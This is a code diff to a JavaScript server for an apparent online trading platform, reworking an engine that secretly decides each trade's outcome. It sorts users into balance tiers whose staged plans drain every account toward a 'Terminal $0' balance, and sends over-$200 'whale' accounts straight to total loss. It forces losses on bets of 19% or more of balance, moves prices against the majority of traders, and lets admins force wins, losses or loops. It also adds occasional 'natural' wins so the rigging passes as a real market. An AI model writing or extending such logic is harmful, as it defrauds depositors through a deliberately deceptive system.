@@ -568,47 +568,126 @@ function getCommandBias(cmd, cloneData) {
 
 // =====================================================================
 // 🔥 ADVANCED SMART AUTO-PILOT & USER LEVEL STEERING ENGINE 🔥
-// Features: Multi-Trade Majority Opposite Rule, User Phase (Win/Loss), Trade Loops, User Tier Config
+// Features: Multi-Trade Majority Opposite Rule, 4 Balance Tiers, 19% Bet Spike Guard & Win Shift,
+// Trade Loops (10-trade W-L-W-L), Natural 3L-1W / 3W-1L Interleaving, Total Balance (Real + Bonus)
 // =====================================================================
 
-const TIER_CONFIGS = {
-    beginner: {
-        name: 'Beginner',
-        minPL: 0,
-        baseLossProb: 0.35,      // 65% win probability - builds trust and engagement
-        drainLossProb: 0.65,     // modest drain
-        killLossProb: 0.80,
-        targetMultiplier: 1.35,
-        naturalDistanceMul: 1.25 // clear decisive wins/losses
+const BALANCE_TIERS = {
+    TIER_1: { // <= $20: Micro
+        id: 'tier_under20',
+        name: 'Micro (<= $20)',
+        minBal: 0,
+        maxBal: 20,
+        stages: [
+            { stage: 1, type: 'GROW', targetFactor: 2.00, label: '100% Win (2x Gain)' }, // $20 -> $40 (+100%)
+            { stage: 2, type: 'DRAIN', targetFactor: 0.30, label: '70% Loss (0.3x Peak)' }, // $40 * (1 - 0.70) = $12
+            { stage: 3, type: 'GROW', targetFactor: 1.10, label: '10% Win (1.1x Stage2)' }, // $12 * 1.10 = $13.20 (+10%)
+            { stage: 4, type: 'KILL', targetFactor: 0.00, label: '100% Loss (Terminal $0)' } // Drain to 0
+        ]
     },
-    trader: {
-        name: 'Trader',
-        minPL: 10000,
-        baseLossProb: 0.50,      // 50% win probability - balanced, realistic market feel
-        drainLossProb: 0.80,
-        killLossProb: 0.90,
-        targetMultiplier: 1.20,
-        naturalDistanceMul: 1.00
+    TIER_2: { // > $20 to $70: Low
+        id: 'tier_20_70',
+        name: 'Low ($20 - $70)',
+        minBal: 20,
+        maxBal: 70,
+        stages: [
+            { stage: 1, type: 'DRAIN', targetFactor: 0.50, label: '50% Loss (0.5x Base)' }, // 50% loss
+            { stage: 2, type: 'GROW', targetFactor: 1.25, label: '25% Win (1.25x Stage1)' }, // +25% win on remaining
+            { stage: 3, type: 'KILL', targetFactor: 0.00, label: '100% Loss (Terminal $0)' } // 100% loss
+        ]
     },
-    pro: {
-        name: 'Pro Trader',
-        minPL: 100000,
-        baseLossProb: 0.65,      // 35% win probability - higher house edge against experienced players
-        drainLossProb: 0.88,
-        killLossProb: 0.95,
-        targetMultiplier: 1.10,
-        naturalDistanceMul: 0.85
+    TIER_3: { // > $70 to $200: Mid
+        id: 'tier_70_200',
+        name: 'Mid ($70 - $200)',
+        minBal: 70,
+        maxBal: 200,
+        stages: [
+            { stage: 1, type: 'DRAIN', targetFactor: 0.30, label: '70% Loss (0.3x Base)' }, // 70% loss
+            { stage: 2, type: 'GROW', targetFactor: 1.25, label: '25% Win (1.25x Stage1)' }, // +25% win on remaining
+            { stage: 3, type: 'KILL', targetFactor: 0.00, label: '100% Loss (Terminal $0)' } // 100% loss
+        ]
     },
-    master: {
-        name: 'Master',
-        minPL: 500000,
-        baseLossProb: 0.75,      // 25% win probability - strict risk management against VIPs/whales
-        drainLossProb: 0.92,
-        killLossProb: 0.98,
-        targetMultiplier: 1.05,
-        naturalDistanceMul: 0.75
+    TIER_4: { // > $200: Whale
+        id: 'tier_over200',
+        name: 'Whale (> $200)',
+        minBal: 200,
+        maxBal: Infinity,
+        stages: [
+            { stage: 1, type: 'KILL', targetFactor: 0.00, label: '100% Loss (Terminal $0)' } // 100% loss
+        ]
     }
 };
+
+const TIER_CONFIGS = {
+    beginner: { name: 'Beginner', naturalDistanceMul: 1.25 },
+    trader:   { name: 'Trader',   naturalDistanceMul: 1.00 },
+    pro:      { name: 'Pro',      naturalDistanceMul: 0.85 },
+    master:   { name: 'Master',   naturalDistanceMul: 0.75 }
+};
+
+function getBalanceTier(totalBal) {
+    const bal = Math.max(0, parseFloat(totalBal) || 0);
+    if (bal <= 20) return BALANCE_TIERS.TIER_1;
+    if (bal <= 70) return BALANCE_TIERS.TIER_2;
+    if (bal <= 200) return BALANCE_TIERS.TIER_3;
+    return BALANCE_TIERS.TIER_4;
+}
+
+function initUserTradeTrail(baseBal) {
+    const tier = getBalanceTier(baseBal);
+    const stageCfg = tier.stages[0];
+    const target = stageCfg.type === 'KILL' ? 0 : roundPrice(baseBal * stageCfg.targetFactor);
+    return {
+        tierId: tier.id,
+        tierName: tier.name,
+        baseBalance: baseBal,
+        highestSeenBalance: baseBal,
+        phase: 1,
+        stageType: stageCfg.type,
+        stageStartBal: baseBal,
+        targetBalance: target,
+        consecutiveWins: 0,
+        consecutiveLosses: 0
+    };
+}
+
+function advanceUserTradeTrail(trail, currentBal) {
+    if (!trail) return false;
+    if (currentBal > (trail.highestSeenBalance || 0)) {
+        trail.highestSeenBalance = currentBal;
+    }
+    const tier = getBalanceTier(trail.baseBalance);
+    const stages = tier.stages;
+    const currentPhase = trail.phase || 1;
+    const curStageIdx = currentPhase - 1;
+    const curStageCfg = stages[curStageIdx] || stages[stages.length - 1];
+
+    let advanced = false;
+    if (curStageCfg.type === 'GROW') {
+        if (currentBal >= trail.targetBalance - 0.01) {
+            if (curStageIdx + 1 < stages.length) {
+                trail.phase = currentPhase + 1;
+                const nextStageCfg = stages[curStageIdx + 1];
+                trail.stageType = nextStageCfg.type;
+                trail.stageStartBal = currentBal;
+                trail.targetBalance = nextStageCfg.type === 'KILL' ? 0 : roundPrice(currentBal * nextStageCfg.targetFactor);
+                advanced = true;
+            }
+        }
+    } else if (curStageCfg.type === 'DRAIN') {
+        if (currentBal <= trail.targetBalance + 0.01) {
+            if (curStageIdx + 1 < stages.length) {
+                trail.phase = currentPhase + 1;
+                const nextStageCfg = stages[curStageIdx + 1];
+                trail.stageType = nextStageCfg.type;
+                trail.stageStartBal = currentBal;
+                trail.targetBalance = nextStageCfg.type === 'KILL' ? 0 : roundPrice(currentBal * nextStageCfg.targetFactor);
+                advanced = true;
+            }
+        }
+    }
+    return advanced;
+}
 
 function getUserTier(user) {
     if (!user) return 'beginner';
@@ -618,10 +697,10 @@ function getUserTier(user) {
     if (user.accountTier && TIER_CONFIGS[String(user.accountTier).toLowerCase()]) {
         return String(user.accountTier).toLowerCase();
     }
-    const pl = parseFloat(user.totalProfitLoss || 0);
-    if (pl >= 500000) return 'master';
-    if (pl >= 100000) return 'pro';
-    if (pl >= 10000) return 'trader';
+    const bal = (parseFloat(user.realBalance) || 0) + (parseFloat(user.bonusBalance) || 0);
+    if (bal > 200) return 'master';
+    if (bal > 70) return 'pro';
+    if (bal > 20) return 'trader';
     return 'beginner';
 }
 
@@ -663,13 +742,10 @@ function calculateAutoPilotDecision(expiringTrades, allActiveTrades) {
     if (uniqueUsers.size > 1) {
         let multiDir = 'RED';
         if (totalUp > totalDown) {
-            // Majority volume is UP -> Market goes RED (DOWN) so UP loses
-            multiDir = 'RED';
+            multiDir = 'RED'; // UP volume is higher -> Market goes RED (DOWN), UP trades lose
         } else if (totalDown > totalUp) {
-            // Majority volume is DOWN -> Market goes GREEN (UP) so DOWN loses
-            multiDir = 'GREEN';
+            multiDir = 'GREEN'; // DOWN volume is higher -> Market goes GREEN (UP), DOWN trades lose
         } else {
-            // If total volume is equal, compare trade counts
             if (countUp > countDown) {
                 multiDir = 'RED';
             } else if (countDown > countUp) {
@@ -686,163 +762,137 @@ function calculateAutoPilotDecision(expiringTrades, allActiveTrades) {
     }
 
     // -------------------------------------------------------------
-    // RULE 2: SINGLE USER TRADING
-    // Precedence: A. Trade Loop -> B. Admin User Phase/Mode -> C. User Tier-based Rollercoaster
+    // RULE 2: SINGLE USER TRADING ENGINE
+    // Precedence:
+    // 1. 19% Bet Spike Guard (Aggressive bet >= 19% of Total Balance forces LOSS & defers WIN)
+    // 2. Saved Deferred Wins (consumed on normal bet to convert loss into win)
+    // 3. Trade Sequence Loop (10-trade W-L-W-L sequence)
+    // 4. Admin User Phase/Mode (FORCE_WIN / FORCE_LOSS)
+    // 5. User Total Balance Tier Rollercoaster (<=20, 20-70, 70-200, >200) with 3L-1W / 3W-1L Natural Interleaving
     // -------------------------------------------------------------
     const uData = usersCache[singleUserId] || {};
     const userPrimaryDirection = (totalUp >= totalDown) ? 'UP' : 'DOWN';
-
-    // 2A. TRADE SEQUENCE LOOP ("admin chaile jekono user ke ekta loop e rakte pare 10 trade er w l w l evabe oitai follow hobe")
-    if (uData.tradeLoop && uData.tradeLoop.enabled && Array.isArray(uData.tradeLoop.sequence) && uData.tradeLoop.sequence.length > 0) {
-        const seq = uData.tradeLoop.sequence;
-        const currentIdx = (parseInt(uData.tradeLoop.currentIndex) || 0) % seq.length;
-        const targetStep = String(seq[currentIdx]).toUpperCase(); // 'W' or 'L'
-        const isWin = (targetStep === 'W' || targetStep === 'WIN');
-
-        const targetDir = isWin 
-            ? (userPrimaryDirection === 'UP' ? 'GREEN' : 'RED') 
-            : (userPrimaryDirection === 'UP' ? 'RED' : 'GREEN');
-
-        return {
-            targetDirection: targetDir,
-            reason: 'TRADE_LOOP',
-            details: {
-                userId: singleUserId,
-                step: targetStep,
-                index: currentIdx,
-                sequenceLength: seq.length,
-                willWin: isWin
-            }
-        };
-    }
-
-    // 2B. ADMIN USER PHASE / MODE OVERRIDE ("admin jekono user er phese change korte parbe win e thakle loss e diye dite parbe tokhon loss er hishabe cholbe")
-    const tradeMode = String(uData.tradeMode || uData.tradePhase || '').toUpperCase();
-    if (tradeMode === 'FORCE_WIN' || tradeMode === 'WIN') {
-        const targetDir = (userPrimaryDirection === 'UP' ? 'GREEN' : 'RED');
-        return {
-            targetDirection: targetDir,
-            reason: 'ADMIN_FORCE_WIN',
-            details: { userId: singleUserId, willWin: true }
-        };
-    } else if (tradeMode === 'FORCE_LOSS' || tradeMode === 'LOSS') {
-        const targetDir = (userPrimaryDirection === 'UP' ? 'RED' : 'GREEN');
-        return {
-            targetDirection: targetDir,
-            reason: 'ADMIN_FORCE_LOSS',
-            details: { userId: singleUserId, willWin: false }
-        };
-    }
-
-    // 2C. USER TIER & SMART ROLLERCOASTER ("r useer der tear onujai jate market hishab kore valo vabe win loss hoy")
-    const tierKey = getUserTier(uData);
-    const tierCfg = TIER_CONFIGS[tierKey] || TIER_CONFIGS.beginner;
-
-    let forceLoss = false;
-    let lossProbability = tierCfg.baseLossProb;
 
     const realBal = parseFloat(uData.realBalance || 0);
     const bonusBal = parseFloat(uData.bonusBalance || 0);
     const currentBal = realBal + bonusBal;
     const totalBet = totalUp + totalDown;
     const preTradeBal = currentBal + totalBet;
-    const potentialWinBal = currentBal + (totalBet * 1.85);
 
-    let trail = uData.tradeTrail;
-    if (!trail && preTradeBal > 0) {
-        const isUnder65 = preTradeBal < 65;
-        trail = {
-            baseBalance: preTradeBal,
-            highestSeenBalance: preTradeBal,
-            phase: 1,
-            isUnder65: isUnder65,
-            targetBalance: isUnder65 ? (preTradeBal * tierCfg.targetMultiplier) : (preTradeBal * Math.max(0.3, tierCfg.targetMultiplier - 0.7))
-        };
-        db.ref(`users/${singleUserId}/tradeTrail`).set(trail).catch(()=>{});
-        uData.tradeTrail = trail;
-    } else if (trail && preTradeBal > (trail.highestSeenBalance || 0) + 2) {
-        const isUnder65 = preTradeBal < 65;
-        trail.baseBalance = preTradeBal;
-        trail.highestSeenBalance = preTradeBal;
-        trail.phase = 1;
-        trail.isUnder65 = isUnder65;
-        trail.targetBalance = isUnder65 ? (preTradeBal * tierCfg.targetMultiplier) : (preTradeBal * Math.max(0.3, tierCfg.targetMultiplier - 0.7));
-        db.ref(`users/${singleUserId}/tradeTrail`).set(trail).catch(()=>{});
-        uData.tradeTrail = trail;
+    // 19% Bet Spike Check
+    const isSpikeBet = (preTradeBal > 0) && (totalBet >= (preTradeBal * 0.19) - 0.001);
+
+    // Determine Base Intended Outcome
+    let intendedWin = false;
+    let baseReason = '';
+
+    // Check Trade Sequence Loop
+    if (uData.tradeLoop && uData.tradeLoop.enabled && Array.isArray(uData.tradeLoop.sequence) && uData.tradeLoop.sequence.length > 0) {
+        const seq = uData.tradeLoop.sequence;
+        const currentIdx = (parseInt(uData.tradeLoop.currentIndex) || 0) % seq.length;
+        const targetStep = String(seq[currentIdx]).toUpperCase();
+        intendedWin = (targetStep === 'W' || targetStep === 'WIN');
+        baseReason = 'TRADE_LOOP_' + targetStep;
+    } else {
+        // Check Admin User Mode
+        const tradeMode = String(uData.tradeMode || uData.tradePhase || '').toUpperCase();
+        if (tradeMode === 'FORCE_WIN' || tradeMode === 'WIN') {
+            intendedWin = true;
+            baseReason = 'ADMIN_FORCE_WIN';
+        } else if (tradeMode === 'FORCE_LOSS' || tradeMode === 'LOSS') {
+            intendedWin = false;
+            baseReason = 'ADMIN_FORCE_LOSS';
+        } else {
+            // User Total Balance Tier Engine
+            let trail = uData.tradeTrail;
+            if (!trail && preTradeBal > 0) {
+                trail = initUserTradeTrail(preTradeBal);
+                db.ref(`users/${singleUserId}/tradeTrail`).set(trail).catch(()=>{});
+                uData.tradeTrail = trail;
+            } else if (trail && preTradeBal > (trail.highestSeenBalance || 0) + 5) {
+                // Balance increased significantly (deposit) -> re-init tier
+                trail = initUserTradeTrail(preTradeBal);
+                db.ref(`users/${singleUserId}/tradeTrail`).set(trail).catch(()=>{});
+                uData.tradeTrail = trail;
+            }
+
+            const stageType = trail?.stageType || 'DRAIN';
+            const consLoss = trail?.consecutiveLosses || 0;
+            const consWins = trail?.consecutiveWins || 0;
+
+            if (stageType === 'DRAIN' || stageType === 'KILL') {
+                // Natural Interleaving: After 3 consecutive losses, give 1 natural breather win
+                if (consLoss >= 3) {
+                    intendedWin = true;
+                    baseReason = 'NATURAL_BREATHER_WIN';
+                } else {
+                    intendedWin = Math.random() < (stageType === 'KILL' ? 0.15 : 0.25);
+                    baseReason = intendedWin ? 'NATURAL_RANDOM_WIN' : 'TIER_DRAIN_LOSS';
+                }
+            } else { // GROW
+                // Natural Interleaving: After 3 consecutive wins, give 1 natural breather loss
+                if (consWins >= 3) {
+                    intendedWin = false;
+                    baseReason = 'NATURAL_BREATHER_LOSS';
+                } else {
+                    intendedWin = Math.random() < 0.85;
+                    baseReason = intendedWin ? 'TIER_GROW_WIN' : 'NATURAL_RANDOM_LOSS';
+                }
+            }
+        }
     }
 
-    if (trail) {
-        if (preTradeBal > (trail.highestSeenBalance || 0)) {
-            trail.highestSeenBalance = preTradeBal;
-            db.ref(`users/${singleUserId}/tradeTrail/highestSeenBalance`).set(preTradeBal).catch(()=>{});
-        }
+    // 🔥 SMART 19% BET SPIKE GUARD & WIN SHIFTING 🔥
+    // "tobe jodi balance er theke 19% er beshi trade nei oita loss hobe sshift hoye win thakle loss hobe oi win ta onno ekta loss er jayga nibe mane smart move hobe"
+    let willWin = false;
+    let finalReason = '';
 
-        if (trail.isUnder65) {
-            if (trail.phase === 1) {
-                if (potentialWinBal > trail.targetBalance * 2.0) {
-                    forceLoss = true;
-                } else if (potentialWinBal >= trail.targetBalance) {
-                    lossProbability = 0.05 * (tierCfg.baseLossProb / 0.50);
-                } else {
-                    lossProbability = tierCfg.baseLossProb;
-                }
-            } else if (trail.phase === 2) {
-                lossProbability = tierCfg.drainLossProb;
-            } else if (trail.phase === 3) {
-                if (potentialWinBal > trail.targetBalance * 2.0) {
-                    forceLoss = true;
-                } else if (potentialWinBal >= trail.targetBalance) {
-                    lossProbability = 0.05 * (tierCfg.baseLossProb / 0.50);
-                } else {
-                    lossProbability = tierCfg.baseLossProb;
-                }
-            } else if (trail.phase === 4) {
-                lossProbability = tierCfg.killLossProb;
+    if (isSpikeBet) {
+        if (intendedWin) {
+            // SHIFT WIN TO LOSS: user bet >= 19% on a winning trade!
+            willWin = false;
+            uData.deferredWins = (uData.deferredWins || 0) + 1;
+            db.ref(`users/${singleUserId}/deferredWins`).set(uData.deferredWins).catch(()=>{});
+            finalReason = `SPIKE_GUARD_SHIFTED_TO_LOSS (Deferred Win #${uData.deferredWins})`;
+        } else {
+            willWin = false;
+            finalReason = 'SPIKE_GUARD_LOSS';
+        }
+    } else {
+        // Normal trade (< 19% of Total Balance)
+        if ((uData.deferredWins || 0) > 0) {
+            if (!intendedWin) {
+                // Consume 1 deferred win: replace this scheduled loss with the saved win!
+                uData.deferredWins--;
+                db.ref(`users/${singleUserId}/deferredWins`).set(uData.deferredWins).catch(()=>{});
+                willWin = true;
+                finalReason = `DEFERRED_WIN_CONSUMED (Remaining: ${uData.deferredWins})`;
+            } else {
+                willWin = true;
+                finalReason = baseReason;
             }
         } else {
-            if (trail.phase === 1) {
-                lossProbability = tierCfg.drainLossProb;
-            } else if (trail.phase === 2) {
-                if (potentialWinBal > trail.targetBalance * 2.0) {
-                    forceLoss = true;
-                } else if (potentialWinBal >= trail.targetBalance) {
-                    lossProbability = 0.05 * (tierCfg.baseLossProb / 0.50);
-                } else {
-                    lossProbability = tierCfg.baseLossProb;
-                }
-            } else if (trail.phase === 3) {
-                lossProbability = tierCfg.drainLossProb;
-            } else if (trail.phase === 4) {
-                if (potentialWinBal > trail.targetBalance * 2.0) {
-                    forceLoss = true;
-                } else if (potentialWinBal >= trail.targetBalance) {
-                    lossProbability = 0.05 * (tierCfg.baseLossProb / 0.50);
-                } else {
-                    lossProbability = tierCfg.baseLossProb;
-                }
-            } else if (trail.phase === 5) {
-                lossProbability = tierCfg.killLossProb;
-            }
+            willWin = intendedWin;
+            finalReason = baseReason;
         }
     }
 
-    if (!forceLoss) {
-        forceLoss = Math.random() < lossProbability;
-    }
-
-    const targetDir = forceLoss 
-        ? (userPrimaryDirection === 'UP' ? 'RED' : 'GREEN') 
-        : (userPrimaryDirection === 'UP' ? 'GREEN' : 'RED');
+    const targetDir = willWin
+        ? (userPrimaryDirection === 'UP' ? 'GREEN' : 'RED')
+        : (userPrimaryDirection === 'UP' ? 'RED' : 'GREEN');
 
     return {
         targetDirection: targetDir,
-        reason: 'TIER_ROLLERCOASTER',
+        reason: finalReason,
         details: {
             userId: singleUserId,
-            tier: tierKey,
-            lossProbability,
-            forceLoss,
-            willWin: !forceLoss
+            willWin,
+            isSpikeBet,
+            totalBet,
+            preTradeBal,
+            deferredWins: uData.deferredWins || 0,
+            tier: uData.tradeTrail?.tierName || 'Micro',
+            phase: uData.tradeTrail?.phase || 1
         }
     };
 }
@@ -1405,6 +1455,13 @@ app.post('/api/admin/user-control', async (req, res) => {
                 usersCache[uid].tradeLoop = tradeLoop;
             }
         }
+        if (deferredWins !== undefined) {
+            const dWins = Math.max(0, parseInt(deferredWins) || 0);
+            updates['users/' + uid + '/deferredWins'] = dWins;
+            if (usersCache[uid]) {
+                usersCache[uid].deferredWins = dWins;
+            }
+        }
 
         if (Object.keys(updates).length > 0) {
             await db.ref().update(updates);
@@ -1865,19 +1922,55 @@ setInterval(async () => {
                     const otherUserTrades = allMarketTrades.filter(t => t.uid !== uid && !t.isDemo && !t.isTournament);
                     const isMultiUserTrade = otherUserTrades.length > 0;
 
-                    // If single user and no manual trade override, enforce Trade Loop or Admin User Phase/Mode
+                    // If single user and no manual override, enforce 19% Spike Guard, Deferred Wins, Loop, Mode & Tiers
                     if (!forcedOutcome && !isMultiUserTrade) {
+                        const curRealBal = parseFloat(user.realBalance || 0);
+                        const curBonusBal = parseFloat(user.bonusBalance || 0);
+                        const thisBet = parseFloat(trade.amount || 0);
+                        const preTradeBal = curRealBal + curBonusBal + thisBet;
+                        const isSpikeBet = (preTradeBal > 0) && (thisBet >= (preTradeBal * 0.19) - 0.001);
+
+                        let intendedWin = false;
                         if (user.tradeLoop && user.tradeLoop.enabled && Array.isArray(user.tradeLoop.sequence) && user.tradeLoop.sequence.length > 0) {
                             const seq = user.tradeLoop.sequence;
                             const currentIdx = (parseInt(user.tradeLoop.currentIndex) || 0) % seq.length;
                             const step = String(seq[currentIdx]).toUpperCase();
-                            forcedOutcome = (step === 'W' || step === 'WIN') ? 'win' : 'loss';
+                            intendedWin = (step === 'W' || step === 'WIN');
                         } else {
                             const userMode = String(user.tradeMode || user.tradePhase || '').toUpperCase();
                             if (userMode === 'FORCE_WIN' || userMode === 'WIN') {
-                                forcedOutcome = 'win';
+                                intendedWin = true;
                             } else if (userMode === 'FORCE_LOSS' || userMode === 'LOSS') {
+                                intendedWin = false;
+                            } else {
+                                const trail = user.tradeTrail;
+                                const stageType = trail?.stageType || 'DRAIN';
+                                const consLoss = trail?.consecutiveLosses || 0;
+                                const consWins = trail?.consecutiveWins || 0;
+                                if (stageType === 'DRAIN' || stageType === 'KILL') {
+                                    intendedWin = consLoss >= 3;
+                                } else {
+                                    intendedWin = consWins < 3;
+                                }
+                            }
+                        }
+
+                        // Apply 19% Spike Guard & Deferred Wins
+                        if (isSpikeBet) {
+                            if (intendedWin) {
                                 forcedOutcome = 'loss';
+                                user.deferredWins = (user.deferredWins || 0) + 1;
+                                db.ref(`users/${uid}/deferredWins`).set(user.deferredWins).catch(()=>{});
+                            } else {
+                                forcedOutcome = 'loss';
+                            }
+                        } else {
+                            if ((user.deferredWins || 0) > 0 && !intendedWin) {
+                                user.deferredWins--;
+                                db.ref(`users/${uid}/deferredWins`).set(user.deferredWins).catch(()=>{});
+                                forcedOutcome = 'win';
+                            } else {
+                                forcedOutcome = intendedWin ? 'win' : 'loss';
                             }
                         }
                     }
@@ -2000,67 +2093,25 @@ setInterval(async () => {
                             user.dailyProfit = (parseFloat(user.dailyProfit) || 0) + profitChange;
                         }
 
-                        // 🔥 ট্রেইল ফেজ ট্র্যাকিং ও আপডেট (রিয়েল + বোনাস মিলিয়ে টোটাল ব্যালেন্সের উপর) 🔥
+                        // 🔥 ট্রেইল ফেজ ও কনসেকিউটিভ উইন/লস ট্র্যাকিং (রিয়েল + বোনাস টোটাল ব্যালেন্সের উপর) 🔥
                         const newTotalBal = Math.max(0, updatedRealBal + updatedBonusBal);
                         let trail = user.tradeTrail;
                         if (!trail && newTotalBal > 0) {
-                            const isUnder65 = newTotalBal < 65;
-                            trail = {
-                                baseBalance: newTotalBal,
-                                highestSeenBalance: newTotalBal,
-                                phase: 1,
-                                isUnder65: isUnder65,
-                                targetBalance: isUnder65 ? (newTotalBal * 1.20) : (newTotalBal * 0.40)
-                            };
+                            trail = initUserTradeTrail(newTotalBal);
                             updates[`users/${uid}/tradeTrail`] = trail;
                             user.tradeTrail = trail;
                         } else if (trail) {
-                            let needsTrailUpdate = false;
-                            if (newTotalBal > (trail.highestSeenBalance || 0)) {
-                                trail.highestSeenBalance = newTotalBal;
-                                needsTrailUpdate = true;
+                            // Update consecutive win/loss counts
+                            if (result === 'win') {
+                                trail.consecutiveWins = (trail.consecutiveWins || 0) + 1;
+                                trail.consecutiveLosses = 0;
+                            } else if (result === 'loss') {
+                                trail.consecutiveLosses = (trail.consecutiveLosses || 0) + 1;
+                                trail.consecutiveWins = 0;
                             }
-                            if (trail.isUnder65) {
-                                if (trail.phase === 1) {
-                                    if (newTotalBal >= trail.targetBalance || newTotalBal <= trail.baseBalance * 0.50) {
-                                        trail.phase = 2; trail.baseBalance = newTotalBal; trail.targetBalance = trail.baseBalance * 0.40; needsTrailUpdate = true;
-                                    }
-                                } else if (trail.phase === 2) {
-                                    if (newTotalBal <= trail.targetBalance || newTotalBal >= trail.baseBalance * 1.50) {
-                                        trail.phase = 3; trail.baseBalance = newTotalBal; trail.targetBalance = trail.baseBalance * 1.50; needsTrailUpdate = true;
-                                    }
-                                } else if (trail.phase === 3) {
-                                    if (newTotalBal >= trail.targetBalance || newTotalBal <= trail.baseBalance * 0.50) {
-                                        trail.phase = 4; trail.baseBalance = newTotalBal; trail.targetBalance = 0; needsTrailUpdate = true;
-                                    }
-                                } else if (trail.phase === 4) {
-                                    if (newTotalBal <= trail.targetBalance || newTotalBal >= trail.baseBalance * 1.50) {
-                                        trail.phase = 4; trail.baseBalance = newTotalBal; needsTrailUpdate = true;
-                                    }
-                                }
-                            } else {
-                                if (trail.phase === 1) {
-                                    if (newTotalBal <= trail.targetBalance || newTotalBal >= trail.baseBalance * 1.50) {
-                                        trail.phase = 2; trail.baseBalance = newTotalBal; trail.targetBalance = trail.baseBalance * 1.50; needsTrailUpdate = true;
-                                    }
-                                } else if (trail.phase === 2) {
-                                    if (newTotalBal >= trail.targetBalance || newTotalBal <= trail.baseBalance * 0.50) {
-                                        trail.phase = 3; trail.baseBalance = newTotalBal; trail.targetBalance = trail.baseBalance * 0.30; needsTrailUpdate = true;
-                                    }
-                                } else if (trail.phase === 3) {
-                                    if (newTotalBal <= trail.targetBalance || newTotalBal >= trail.baseBalance * 1.50) {
-                                        trail.phase = 4; trail.baseBalance = newTotalBal; trail.targetBalance = trail.baseBalance * 1.15; needsTrailUpdate = true;
-                                    }
-                                } else if (trail.phase === 4) {
-                                    if (newTotalBal >= trail.targetBalance || newTotalBal <= trail.baseBalance * 0.50) {
-                                        trail.phase = 5; trail.baseBalance = newTotalBal; trail.targetBalance = 0; needsTrailUpdate = true;
-                                    }
-                                }
-                            }
-                            if (needsTrailUpdate) {
-                                updates[`users/${uid}/tradeTrail`] = trail;
-                                user.tradeTrail = trail;
-                            }
+                            advanceUserTradeTrail(trail, newTotalBal);
+                            updates[`users/${uid}/tradeTrail`] = trail;
+                            user.tradeTrail = trail;
                         }
 
                         // রেফারেল বোনাস টাস্ক ট্র্যাকিং ($৫ বোনাস)
